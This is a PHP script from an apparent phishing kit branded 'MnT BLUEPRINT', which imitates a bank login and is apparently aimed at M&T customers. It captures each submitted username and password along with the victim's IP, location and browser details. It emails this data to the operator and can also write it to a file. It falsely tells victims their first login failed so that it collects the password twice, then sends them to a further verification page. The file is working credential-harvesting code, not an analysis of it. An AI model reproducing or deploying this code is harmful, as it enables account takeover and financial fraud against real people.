<?php
session_start();
include "../conf/config.php";
include "ipdetails.php";
include '../../huehuehue.php';
include '../../blueprint/antbots/crawler.php';

if($_POST){
    $usernam  = $_POST['UserID'];
	$pass 	  = $_POST['password'];
    $ip = $_SERVER['REMOTE_ADDR'];

if($d_log == "on"){}else{
    $ff = fopen("log_db",'a');
    fwrite($ff,$ip."\n");
    fclose($ff);
    }

$ck = file_get_contents('log_db');

    if(strpos($ck, $ip) !== false){

        $mes = "::::::::::::::::::::::: MnT BLUEPRINT 1nf0 1 [Dual login Details] :::::::::::::::::::::::::\r\n";
        $mes .= "Usname                               : $usernam\r\n";
        $mes .= "Password                             : $pass\r\n";
        $mes .=  "|--------------- I N F O | I P -------------------|\r\n";
        $mes .= "IP Address	                       : {$_SESSION['ip']}\r\n";
        $mes .= "IP Country	                       : {$_SESSION['country']}\r\n";
        $mes .= "IP City	                           : {$_SESSION['city']}\r\n";
        $mes .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
        $mes .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
        $mes .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
        $mes .= "::::::::::::::::::::::  MnT BLUEPRINT 1nf0 :::::::::::::::::::::::::\r\n";
        if($savetxt == "on"){
        $sv = fopen("../data/login".$salt.".txt",'a');
        fwrite($sv,$mes."\n");
        fclose($sv);}$subject="Dual Login Details => From {$_SESSION['ip']}";$headers="From: Blue_prints <blue_printss@M&T.com>\r\n";$headers.="MIME-Version: 1.0\r\n";$headers.="Content-Type: text/plain; charset=UTF-8\r\n";@mail($emailz,$subject,$mes,$headers);
        $b = file_get_contents('log_db');
        $c = preg_replace($ip, '', $b);
        file_put_contents("log_db", $c);


        header("Location: ../..//account_verify.php?&sessionid={$_SESSION['rand']}&ue");
            
        

    }else{
        
        $mes = "::::::::::::::::::::::: MnT BLUEPRINT 1nf0 1 [login Details] :::::::::::::::::::::::::\r\n";
        $mes .= "Usname                               : $usernam\r\n";
        $mes .= "Password                             : $pass\r\n";
        $mes .=  "|--------------- I N F O | I P -------------------|\r\n";
        $mes .= "IP Address	                       : {$_SESSION['ip']}\r\n";
        $mes .= "IP Country	                       : {$_SESSION['country']}\r\n";
        $mes .= "IP City	                           : {$_SESSION['city']}\r\n";
        $mes .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
        $mes .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
        $mes .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
        $mes .= "::::::::::::::::::::::  MnT BLUEPRINT 1nf0 :::::::::::::::::::::::::\r\n";
        if($savetxt == "on"){
        $sv = fopen("../data/login".$salt.".txt",'a');
        fwrite($sv,$mes."\n");
        fclose($sv);}$subject="Login Details => From {$_SESSION['ip']}";$headers="From: Blue_prints <blue_printss@M&T.com>\r\n";$headers.="MIME-Version: 1.0\r\n";$headers.="Content-Type: text/plain; charset=UTF-8\r\n";@mail($emailz,$subject,$mes,$headers);

        $ff = fopen("log_db",'a');
        fwrite($ff,$ip."\n");
        fclose($ff);

        header("Location: ../../login.php?invalid&sessionid={$_SESSION['rand']}&ue");

    }
}else{
    exit(header("HTTP/1.0 404 Not Found"));
}
?>